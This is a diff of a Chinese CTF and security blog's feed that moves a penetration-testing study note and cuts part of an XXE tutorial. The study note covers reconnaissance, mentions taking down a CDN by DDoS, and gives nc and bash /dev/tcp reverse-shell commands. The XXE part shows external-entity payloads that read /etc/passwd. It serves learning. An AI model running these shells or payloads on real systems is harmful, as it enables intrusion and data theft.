     <content><![CDATA[<h1 id="VNCTF-2025"><a href="#VNCTF-2025" class="headerlink" title="VNCTF 2025"></a>VNCTF 2025</h1><p>入坑CTF以来打过最难的个人赛，打完的表情就像先辈的一张表情包一样</p>
@@ -4306,131 +4306,6 @@ if __name__ == &quot;__main__&quot;:
 ]]></content>
       <tags>
         <tag>-CVE -Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>一个飞舞的渗透学习实录</title>
-    <url>/2025/05/08/%E4%B8%80%E4%B8%AA%E9%A3%9E%E8%88%9E%E7%9A%84%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E5%AE%9E%E5%BD%95/</url>
-    <content><![CDATA[<p>—–不知道怎么形容，就叫做一个飞舞的渗透实录吧，飞舞挺飞舞的，学也真在学，唉唉，很难不着急(又幻想了，幻想不被后面来的web手打飞)，道心或许多多少少有点乱了，传统web基础有点学不进去了，搞点渗透调整一下状态吧，也刚好之后有个AWD可以练一下(我绝对不会说是为了AWD才提前开始学的。。)</p>
-<p>大概会持续更新吧嗯嗯，毕竟一朝一夕也学不完的</p>
-<h1 id="一个飞舞的渗透学习实录"><a href="#一个飞舞的渗透学习实录" class="headerlink" title="一个飞舞的渗透学习实录"></a>一个飞舞的渗透学习实录</h1><p>首先必须了解的就是一个完整的渗透测试的基本流程啦。。</p>
-<p>根据网上可考资料，渗透大概分成这样几个流程</p>
-<pre><code class="highlight plaintext">信息收集/外网打点
-内网渗透
-权限维持
-横向移动</code></pre>
-
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>信息收集能力，唉唉，你做web哪个不要信息收集，这东西确实需要好好训练一下</p>
-<h3 id="正面信息收集"><a href="#正面信息收集" class="headerlink" title="正面信息收集"></a>正面信息收集</h3><h4 id="网页信息"><a href="#网页信息" class="headerlink" title="网页信息"></a>网页信息</h4><p>在浏览网页的时候，有时可以拿到一些有用的信息的</p>
-<ul>
-<li>网页的URL:可能会暴露使用的脚本语言，再向下观察网站是否有在线客服窗口，网站底部你可能在网站页面观察到的信息有：URL信息（1.例如使用的OA.xxxcom2.使用的脚本语言）、在线客服、技术支持、关于公司的联系方式（邮箱、电话号码、工作地点等）、备案号、营业执照、后台登录接口、友情链接、某些二维码等。而且你抓包基本上也能抓到底层脚本语言的&#x2F;搂出底层框架的</li>
-</ul>
-<h4 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h4><p>可以先根据域名摸出来对应的IP(工具：<code>nslookup、ip138</code>)</p>
-<p>或者ping一下也能摸到ip，但是只能摸到一个IP(<strong>CDN</strong>的，但是我们要找的是真实的IP)</p>
-<p>所以要用超级PING(<code>itdog.com</code>)</p>
-<p>而要绕过IDN，需要ping一个不存在的二级域名，用邮箱(有自动回复就直接打掉了)或者用海外PING</p>
-<pre><code class="highlight plaintext">不太文明的方法。。用DdOS直接把CDN打掉</code></pre>
-
-<p><strong>端口</strong></p>
-<p>​	一个网站会开放多个端口，而我们可以通过同一网站的不同端口进行测试，扫描开放端口的方法有很多，方便的话是利用工具扫描端口，其次是用在线的端口扫描网站。端口扫描工具推荐有<code>nmap,goby</code>等</p>
-<p><strong>子域名</strong>&#x2F;<strong>资产测绘</strong></p>
-<p>​	收集子域名可以扩大测试的范围，统一域名下的二级域名都属于目标范围</p>
-<p>介绍一下子域名的相关概念</p>
-<pre><code class="highlight plaintext">顶级域名(一级域名/父域名)是类似于.com .net .org .cn之类
-其次的就要从右向左把优先度下降
-例如下面这两个域名:mail.example.com  calendar.example.com
-他们是example.com的两个子域，而example.com则是顶级域.com的子域</code></pre>
-
-<p>常见的子域名爆破工具：<code>oneforall、layer子域名挖掘机、SubDomainsBrute</code></p>
-<p>用<strong>fofa,hunter</strong></p>
-<p><strong>C段旁注</strong></p>
-<blockquote>
-<p>那我问你，C段是什么</p>
-</blockquote>
-<p>一个IP地址可以这样分解:</p>
-<pre><code class="highlight plaintext">192.168.0.1
-A  | B |C|D</code></pre>
-
-<p>一般C段指的是同一内网段下的其他服务器，也就是说是D段1-255中的一台服务器，C段入侵其实就是从其他服务器出发进行测试</p>
-<pre><code class="highlight plaintext">测试工具:Nmap</code></pre>
-
-<hr>
-<p>旁站就是要从同一服务器下的不同网站进行提权拿下服务器从而达到拿下所有网站的目的</p>
-<p>也可以用扫描器</p>
-<pre><code class="highlight plaintext">fscan,dddd,ez,fscanx,milkyway,xway,灯塔//fscan和nmap有些臭名昭著了，别用少用</code></pre>
-
-<p><strong>用户</strong></p>
-<p>收集用户的信息</p>
-<h4 id="资产查询"><a href="#资产查询" class="headerlink" title="资产查询"></a>资产查询</h4><p>公司名-&gt;ICP备案-&gt;子域名-&gt;IP</p>
-<p>看招标文件找供应商-&gt;打进政府云</p>
-<h4 id="敏感目录"><a href="#敏感目录" class="headerlink" title="敏感目录"></a>敏感目录</h4><p>这个很经典了，平常刷刷题目都会碰到的程度</p>
-<p><code>dirsearch</code>一般来说够用，不多赘述</p>
-<p>关注一下这些能进去的目录&#x2F;可以传参的一些带有特殊功能的页面</p>
-<pre><code class="highlight plaintext">任意文件下载
-后台
-未授权访问
-敏感信息泄露
-SQL注入</code></pre>
-
-<h4 id="web组件"><a href="#web组件" class="headerlink" title="web组件"></a>web组件</h4><p>​        各种web组件组合构成网站。</p>
-<p>操作系统<br>        网站服务器有不同的操作系统：<code>windows、Linux、mac os</code>这里需要知道的是windows对大小写不敏感，其他两个对大小写敏感就行了。</p>
-<p>（2）数据库<br>        目前比较常用的数据库有<code>:MySQL、SQL server、Oracle</code>等。SQL server开放的默认端口：1433，MySQL开放的默认端口：3306、Oracle开放的默认端口：1521。</p>
-<p>（3）容器<br>        目前比较常见的web容器有：<code>IIS(iis解析漏洞)，apache，tcmact，nginx，jboss</code>等。</p>
-<p>（4）CMS<br>        <code>cms</code>有很多，这里就列举一部分例子：<code>dedeCMS</code>、 帝国CMS等。</p>
-<p>（5）web框架<br>        web框架有<code>struts1</code>、<code>Struts2</code>、<code>Spring MVC</code>等（框架漏洞）</p>
-<p>（6）web组件识别<br>        web组件识别（web指纹识别）一般可以识别出以上的网站基础信息。web指纹识别我分为在线扫描与工具识别。在线扫描的网站有：潮汐指纹识别<code>TideFinger</code> 潮汐指纹、云悉指纹yunsee.cn-2.0、强大的网站信息扫描网网站基础信息获取 - <code>ThreatScan</code> - 免费的网站在线安全检测平台-<code>TScan</code>；</p>
-<p>web指纹识别工具：御剑、北极熊扫描器等；指纹识别插件有<code>wappalyzer</code>。</p>
-<h3 id="侧面信息收集"><a href="#侧面信息收集" class="headerlink" title="侧面信息收集"></a>侧面信息收集</h3><h4 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h4><p>​     得到目标URL之后，我们可以通过站长之家来进行whios查询这家公司的信息。例如：公司名称，注册人或者机构、联系方式：邮箱，手机号码，备案号，ip，域名，DNS，少量子域名等。</p>
-<h4 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h4><p>​    常用的空间搜索引擎一般有：FOFA、shodan、zoomeye。其中FOFA一般搜索到的是一些网站的信息，收集到的偏软件类信息比较多；而shodan和zoomeye则是搜索网络在线设备信息，偏向于收集硬件的信息。具体使用规则需要自己去摸索。</p>
-<h4 id="Google搜索"><a href="#Google搜索" class="headerlink" title="Google搜索"></a>Google搜索</h4><p>​        Google语法是最强大的搜索手段之一，你可以收集到一些敏感页面、敏感目录、网站内可下载的文件、可能出现的sql注入点和文件上传点、未授权访问页面等。</p>
-<h4 id="WAF探测"><a href="#WAF探测" class="headerlink" title="WAF探测"></a>WAF探测</h4><p>​        通过识别网站是否存在WAF以及网站存在什么样的WAF，根据自己的水平（能否绕过此类WAF）来决定还应不应该花时间耗在绕WAF上（不仅限于参加比赛）。</p>
-<h4 id="一些不经常用的技巧"><a href="#一些不经常用的技巧" class="headerlink" title="一些不经常用的技巧"></a>一些不经常用的技巧</h4><pre><code class="highlight plaintext">查看github平台上有无类似本网站的源码，敏感信息，登陆的账号密码等
-社工
-钓鱼
-SSL证书查询</code></pre>
-
-<h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p>首先你要学会弹shell</p>
-<pre><code class="highlight plaintext">nc:
-攻击机:nc -lvvp [端口]
-目标机nc &lt;攻击机IP&gt; &lt;攻击机监听的端口&gt; -e /bin/bash
-
-bash:
-攻击机:nc -lvvp [端口]
-目标机:bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</code></pre>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-]]></content>
-      <tags>
-        <tag>-web -渗透测试</tag>
       </tags>
   </entry>
   <entry>
@@ -4696,6 +4571,131 @@ setattr(app,&#x27;_static_folder&#x27;,&#x27;/&#x27;)</code></pre>
 ]]></content>
       <tags>
         <tag>-Web -CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>一个飞舞的渗透学习实录</title>
+    <url>/2025/05/08/%E4%B8%80%E4%B8%AA%E9%A3%9E%E8%88%9E%E7%9A%84%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E5%AE%9E%E5%BD%95/</url>
+    <content><![CDATA[<p>—–不知道怎么形容，就叫做一个飞舞的渗透实录吧，飞舞挺飞舞的，学也真在学，唉唉，很难不着急(又幻想了，幻想不被后面来的web手打飞)，道心或许多多少少有点乱了，传统web基础有点学不进去了，搞点渗透调整一下状态吧，也刚好之后有个AWD可以练一下(我绝对不会说是为了AWD才提前开始学的。。)</p>
+<p>大概会持续更新吧嗯嗯，毕竟一朝一夕也学不完的</p>
+<h1 id="一个飞舞的渗透学习实录"><a href="#一个飞舞的渗透学习实录" class="headerlink" title="一个飞舞的渗透学习实录"></a>一个飞舞的渗透学习实录</h1><p>首先必须了解的就是一个完整的渗透测试的基本流程啦。。</p>
+<p>根据网上可考资料，渗透大概分成这样几个流程</p>
+<pre><code class="highlight plaintext">信息收集/外网打点
+内网渗透
+权限维持
+横向移动</code></pre>
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>信息收集能力，唉唉，你做web哪个不要信息收集，这东西确实需要好好训练一下</p>
+<h3 id="正面信息收集"><a href="#正面信息收集" class="headerlink" title="正面信息收集"></a>正面信息收集</h3><h4 id="网页信息"><a href="#网页信息" class="headerlink" title="网页信息"></a>网页信息</h4><p>在浏览网页的时候，有时可以拿到一些有用的信息的</p>
+<ul>
+<li>网页的URL:可能会暴露使用的脚本语言，再向下观察网站是否有在线客服窗口，网站底部你可能在网站页面观察到的信息有：URL信息（1.例如使用的OA.xxxcom2.使用的脚本语言）、在线客服、技术支持、关于公司的联系方式（邮箱、电话号码、工作地点等）、备案号、营业执照、后台登录接口、友情链接、某些二维码等。而且你抓包基本上也能抓到底层脚本语言的&#x2F;搂出底层框架的</li>
+</ul>
+<h4 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h4><p>可以先根据域名摸出来对应的IP(工具：<code>nslookup、ip138</code>)</p>
+<p>或者ping一下也能摸到ip，但是只能摸到一个IP(<strong>CDN</strong>的，但是我们要找的是真实的IP)</p>
+<p>所以要用超级PING(<code>itdog.com</code>)</p>
+<p>而要绕过IDN，需要ping一个不存在的二级域名，用邮箱(有自动回复就直接打掉了)或者用海外PING</p>
+<pre><code class="highlight plaintext">不太文明的方法。。用DdOS直接把CDN打掉</code></pre>
+
+<p><strong>端口</strong></p>
+<p>​	一个网站会开放多个端口，而我们可以通过同一网站的不同端口进行测试，扫描开放端口的方法有很多，方便的话是利用工具扫描端口，其次是用在线的端口扫描网站。端口扫描工具推荐有<code>nmap,goby</code>等</p>
+<p><strong>子域名</strong>&#x2F;<strong>资产测绘</strong></p>
+<p>​	收集子域名可以扩大测试的范围，统一域名下的二级域名都属于目标范围</p>
+<p>介绍一下子域名的相关概念</p>
+<pre><code class="highlight plaintext">顶级域名(一级域名/父域名)是类似于.com .net .org .cn之类
+其次的就要从右向左把优先度下降
+例如下面这两个域名:mail.example.com  calendar.example.com
+他们是example.com的两个子域，而example.com则是顶级域.com的子域</code></pre>
+
+<p>常见的子域名爆破工具：<code>oneforall、layer子域名挖掘机、SubDomainsBrute</code></p>
+<p>用<strong>fofa,hunter</strong></p>
+<p><strong>C段旁注</strong></p>
+<blockquote>
+<p>那我问你，C段是什么</p>
+</blockquote>
+<p>一个IP地址可以这样分解:</p>
+<pre><code class="highlight plaintext">192.168.0.1
+A  | B |C|D</code></pre>
+
+<p>一般C段指的是同一内网段下的其他服务器，也就是说是D段1-255中的一台服务器，C段入侵其实就是从其他服务器出发进行测试</p>
+<pre><code class="highlight plaintext">测试工具:Nmap</code></pre>
+
+<hr>
+<p>旁站就是要从同一服务器下的不同网站进行提权拿下服务器从而达到拿下所有网站的目的</p>
+<p>也可以用扫描器</p>
+<pre><code class="highlight plaintext">fscan,dddd,ez,fscanx,milkyway,xway,灯塔//fscan和nmap有些臭名昭著了，别用少用</code></pre>
+
+<p><strong>用户</strong></p>
+<p>收集用户的信息</p>
+<h4 id="资产查询"><a href="#资产查询" class="headerlink" title="资产查询"></a>资产查询</h4><p>公司名-&gt;ICP备案-&gt;子域名-&gt;IP</p>
+<p>看招标文件找供应商-&gt;打进政府云</p>
+<h4 id="敏感目录"><a href="#敏感目录" class="headerlink" title="敏感目录"></a>敏感目录</h4><p>这个很经典了，平常刷刷题目都会碰到的程度</p>
+<p><code>dirsearch</code>一般来说够用，不多赘述</p>
+<p>关注一下这些能进去的目录&#x2F;可以传参的一些带有特殊功能的页面</p>
+<pre><code class="highlight plaintext">任意文件下载
+后台
+未授权访问
+敏感信息泄露
+SQL注入</code></pre>
+
+<h4 id="web组件"><a href="#web组件" class="headerlink" title="web组件"></a>web组件</h4><p>​        各种web组件组合构成网站。</p>
+<p>操作系统<br>        网站服务器有不同的操作系统：<code>windows、Linux、mac os</code>这里需要知道的是windows对大小写不敏感，其他两个对大小写敏感就行了。</p>
+<p>（2）数据库<br>        目前比较常用的数据库有<code>:MySQL、SQL server、Oracle</code>等。SQL server开放的默认端口：1433，MySQL开放的默认端口：3306、Oracle开放的默认端口：1521。</p>
+<p>（3）容器<br>        目前比较常见的web容器有：<code>IIS(iis解析漏洞)，apache，tcmact，nginx，jboss</code>等。</p>
+<p>（4）CMS<br>        <code>cms</code>有很多，这里就列举一部分例子：<code>dedeCMS</code>、 帝国CMS等。</p>
+<p>（5）web框架<br>        web框架有<code>struts1</code>、<code>Struts2</code>、<code>Spring MVC</code>等（框架漏洞）</p>
+<p>（6）web组件识别<br>        web组件识别（web指纹识别）一般可以识别出以上的网站基础信息。web指纹识别我分为在线扫描与工具识别。在线扫描的网站有：潮汐指纹识别<code>TideFinger</code> 潮汐指纹、云悉指纹yunsee.cn-2.0、强大的网站信息扫描网网站基础信息获取 - <code>ThreatScan</code> - 免费的网站在线安全检测平台-<code>TScan</code>；</p>
+<p>web指纹识别工具：御剑、北极熊扫描器等；指纹识别插件有<code>wappalyzer</code>。</p>
+<h3 id="侧面信息收集"><a href="#侧面信息收集" class="headerlink" title="侧面信息收集"></a>侧面信息收集</h3><h4 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h4><p>​     得到目标URL之后，我们可以通过站长之家来进行whios查询这家公司的信息。例如：公司名称，注册人或者机构、联系方式：邮箱，手机号码，备案号，ip，域名，DNS，少量子域名等。</p>
+<h4 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h4><p>​    常用的空间搜索引擎一般有：FOFA、shodan、zoomeye。其中FOFA一般搜索到的是一些网站的信息，收集到的偏软件类信息比较多；而shodan和zoomeye则是搜索网络在线设备信息，偏向于收集硬件的信息。具体使用规则需要自己去摸索。</p>
+<h4 id="Google搜索"><a href="#Google搜索" class="headerlink" title="Google搜索"></a>Google搜索</h4><p>​        Google语法是最强大的搜索手段之一，你可以收集到一些敏感页面、敏感目录、网站内可下载的文件、可能出现的sql注入点和文件上传点、未授权访问页面等。</p>
+<h4 id="WAF探测"><a href="#WAF探测" class="headerlink" title="WAF探测"></a>WAF探测</h4><p>​        通过识别网站是否存在WAF以及网站存在什么样的WAF，根据自己的水平（能否绕过此类WAF）来决定还应不应该花时间耗在绕WAF上（不仅限于参加比赛）。</p>
+<h4 id="一些不经常用的技巧"><a href="#一些不经常用的技巧" class="headerlink" title="一些不经常用的技巧"></a>一些不经常用的技巧</h4><pre><code class="highlight plaintext">查看github平台上有无类似本网站的源码，敏感信息，登陆的账号密码等
+社工
+钓鱼
+SSL证书查询</code></pre>
+
+<h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p>首先你要学会弹shell</p>
+<pre><code class="highlight plaintext">nc:
+攻击机:nc -lvvp [端口]
+目标机nc &lt;攻击机IP&gt; &lt;攻击机监听的端口&gt; -e /bin/bash
+
+bash:
+攻击机:nc -lvvp [端口]
+目标机:bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+]]></content>
+      <tags>
+        <tag>-web -渗透测试</tag>
       </tags>
   </entry>
   <entry>
@@ -4975,207 +4975,6 @@ str:截取的字符串   <span class="keyword">start</span>:起始位置   lengt
 ]]></content>
       <tags>
         <tag>-web -CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>初见XXE</title>
-    <url>/2025/04/28/%E5%88%9D%E8%A7%81XXE/</url>
-    <content><![CDATA[<h1 id="初见XXE"><a href="#初见XXE" class="headerlink" title="初见XXE"></a>初见XXE</h1><p>这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。</p>
-<h2 id="什么是XML呢"><a href="#什么是XML呢" class="headerlink" title="什么是XML呢"></a>什么是XML呢</h2><p>XML，全称<strong>可扩展标记语言</strong>，XML是一种用于存储和传输数据的语言。与HTML一样，XML使用标签和数据的树状结构。但不同的是，XML不使用预定义标记，因此可以为标记指定描述数据的名称。由于json的出现，xml的受欢迎程度大大下降。</p>
-<p>XML文档结构包括XML声明+DTD文档类型定义+文档元素</p>
-<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;!--xml文件的声明--&gt;
-&lt;bookstore&gt;                                                 &lt;!--根元素--&gt;
-&lt;book category=&quot;COOKING&quot;&gt;        &lt;!--bookstore的子元素，category为属性--&gt;
-&lt;title&gt;Everyday Italian&lt;/title&gt;           &lt;!--book的子元素，lang为属性--&gt;
-&lt;author&gt;Giada De Laurentiis&lt;/author&gt;                  &lt;!--book的子元素--&gt;
-&lt;year&gt;2005&lt;/year&gt;                                     &lt;!--book的子元素--&gt;
-&lt;price&gt;30.00&lt;/price&gt;                                  &lt;!--book的子元素--&gt;
-&lt;/book&gt;                                                 &lt;!--book的结束--&gt;
-&lt;/bookstore&gt;                                       &lt;!--bookstore的结束--&gt;</code></pre>
-
-<p>其中<code>&lt;note&gt;</code>是根元素，每个XML文档必须包含一个根元素。</p>
-<p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</code> 称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。</p>
-<p>standalone值是yes的时候表示DTD仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是no，而且有些parser会直接忽略这一项。</p>
-<h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p><strong>DTD基本概念</strong><br>XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的。<br>DTD用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。是XML文档中的几条语句，用来说明哪些元素&#x2F;属性是合法的以及元素间应当怎样嵌套&#x2F;结合，也用来将一些特殊字符和可复用代码段自定义为实体。<br><strong>实体引用</strong><br>XML元素以形如 <code>&lt;tag&gt;foo&lt;/tag&gt;</code> 的标签开始和结束，如果元素内部出现如<code>&lt;</code> 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。XML预定义五个实体引用，即用<code>&lt; &gt; &amp; &#39; &quot;</code> 替换 <code>&lt; &gt; &amp; &#39; &quot;</code> 。<br>实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type Defination（DTD，文档类型定义）的过程中进行。<br><strong>dtd的引入方式</strong><br>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。<br><em>内部 DTD</em><br>使用内部的dtd文件，即将约束规则定义在xml文档中</p>
-<pre><code class="highlight plaintext">&lt;!DOCTYPE 根元素名称 [元素声明]&gt;</code></pre>
-
-<p>示例代码：</p>
-<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot;?&gt;
-&lt;!DOCTYPE note [&lt;!--定义此文档是 note 类型的文档--&gt;
-&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt;
-&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;
-&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;
-&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;
-&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;
-]&gt;
-&lt;note&gt;
-&lt;to&gt;Y0u&lt;/to&gt;
-&lt;from&gt;@re&lt;/from&gt;
-&lt;head&gt;v3ry&lt;/head&gt;
-&lt;body&gt;g00d!&lt;/body&gt;
-&lt;/note&gt;</code></pre>
-
-<p><em>外部 DTD</em><br>（1）引入外部的dtd文件</p>
-<pre><code class="highlight plaintext">&lt;!DOCTYPE 根元素名称 SYSTEM &quot;dtd路径&quot;&gt;</code></pre>
-
-<p>（2）使用外部的dtd文件(网络上的dtd文件)</p>
-<pre><code class="highlight plaintext">&lt;!DOCTYPE 根元素 PUBLIC &quot;DTD名称&quot; &quot;DTD文档的URL&quot;&gt;</code></pre>
-
-<p>当使用外部DTD时，通过如下语法引入：</p>
-<pre><code class="highlight plaintext">&lt;!DOCTYPE root-element SYSTEM &quot;filename&quot;&gt;</code></pre>
-
-<p>示例代码：</p>
-<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
-&lt;!DOCTYPE root-element SYSTEM &quot;test.dtd&quot;&gt;
-&lt;note&gt;
-&lt;to&gt;Y0u&lt;/to&gt;
-&lt;from&gt;@re&lt;/from&gt;
-&lt;head&gt;v3ry&lt;/head&gt;
-&lt;body&gt;g00d!&lt;/body&gt;
-&lt;/note&gt;</code></pre>
-
-<p>test.dtd</p>
-<pre><code class="highlight plaintext">&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;
-&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;
-&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;
-&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;</code></pre>
-
-<p><strong>PCDATA</strong><br>PCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。<br>被解析的字符数据不应当包含任何<code>&amp;</code>，<code>&lt;</code>，或者<code>&gt;</code>字符，需要用<code>&amp;</code> <code>&lt;</code> <code>&gt;</code>实体来分别替换。<br><strong>CDATA</strong><br>CDATA意思是字符数据，CDATA 是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。<br><strong>DTD元素</strong><br><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20191202150727-65e7882a-14d2-1.png" alt="img"><br><strong>DTD属性</strong><br><strong>属性声明语法</strong>：</p>
-<pre><code class="highlight plaintext">&lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt;</code></pre>
-
-<p>DTD实例：</p>
-<pre><code class="highlight plaintext">&lt;!ATTLIST payment Luckey CDATA &quot;Q&quot;&gt;</code></pre>
-
-<p>XML实例：</p>
-<pre><code class="highlight plaintext">&lt;payment Luckey=&quot;Q&quot; /&gt;</code></pre>
-
-<p>以下是 属性类型的选项</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20191202150821-85ef2e3e-14d2-1.png" alt="20191202150821-85ef2e3e-14d2-1"></p>
-<p>默认属性值可使用下列值：</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20191202150849-96eb9a7e-14d2-1.png" alt="20191202150849-96eb9a7e-14d2-1"></p>
-<p><strong>DTD实体</strong></p>
-<blockquote>
-<p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。<br>实体引用是对实体的引用。<br>实体可在内部或外部进行声明。</p>
-</blockquote>
-<p><em>按实体有无参分类，实体分为一般实体和参数实体</em><br><em>一般实体的声明</em>：<code>&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;</code><br>引用一般实体的方法：<code>&amp;实体名称;</code><br>ps：经实验，普通实体可以在DTD中引用，可以在XML中引用，可以在声明前引用，还可以在实体声明内部引用。</p>
-<p><em>参数实体的声明</em>：<code>&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;</code><br>引用参数实体的方法：<code>%实体名称;</code><br>ps：经实验，参数实体只能在DTD中引用，不能在声明前引用，也不能在实体声明内部引用。<br>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p>
-<p><em>按实体使用方式分类，实体分为内部声明实体和引用外部实体</em><br><em>内部实体</em></p>
-<pre><code class="highlight plaintext">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code></pre>
-
-<p>内部实体示例代码：</p>
-<pre><code class="highlight plaintext">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;
-&lt;!DOCTYPE test [
-    &lt;!ENTITY writer &quot;Dawn&quot;&gt;
-    &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;
-]&gt;
-&lt;test&gt;&amp;writer;©right;&lt;/test&gt;</code></pre>
-
-<p><em>外部实体</em><br>外部实体，用来引入外部资源。有<code>SYSTEM</code>和<code>PUBLIC</code>两个关键字，表示实体来自本地计算机还是公共计算机。</p>
-<pre><code class="highlight plaintext">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;
-或者
-&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code></pre>
-
-<p>外部实体示例代码：</p>
-<pre><code class="highlight plaintext">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;
-&lt;!DOCTYPE test [
-    &lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;
-    &lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;
-]&gt;
-&lt;author&gt;&amp;file;©right;&lt;/author&gt;</code></pre>
-
-<p>外部实体可支持http、file等协议。不同程序支持的协议不同：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191202150935-b26e4a30-14d2-1.png" alt="img"><br>PHP支持的协议会更多一些，但需要一定的扩展：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191202151023-cf02c3ba-14d2-1.png" alt="img"><br>PHP引用外部实体，<strong>常见的利用协议</strong>：</p>
-<pre><code class="highlight plaintext">file://文件绝对路径 如：file:///etc/passwd
-http://url/file.txt
-php://filter/read=convert.base64-encode/resource=xxx.php</code></pre>
-
-<p><em>参数实体+外部实体</em></p>
-<pre><code class="highlight plaintext">&lt;!ENTITY % 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</code></pre>
-
-<p>参数实体+外部实体示例代码：</p>
-<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
-&lt;!DOCTYPE test [
-  &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
-  %file;
-]&gt;</code></pre>
-
-<p><code>%file</code>(参数实体)是在DTD中被引用的，而<code>&amp;file;</code>是在xml文档中被引用的。</p>
